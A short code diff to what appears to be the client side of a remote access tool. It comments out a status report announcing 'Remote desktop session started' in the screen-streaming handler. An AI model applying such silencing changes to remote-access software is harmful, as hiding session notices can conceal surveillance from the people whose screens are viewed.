@@ -56,7 +56,7 @@ namespace Rouzzf.Client.Messages
             {
                 _streamCodec?.Dispose();
                 _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                OnReport("Remote desktop session started");
+                //OnReport("Remote desktop session started");
             }
 
             if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
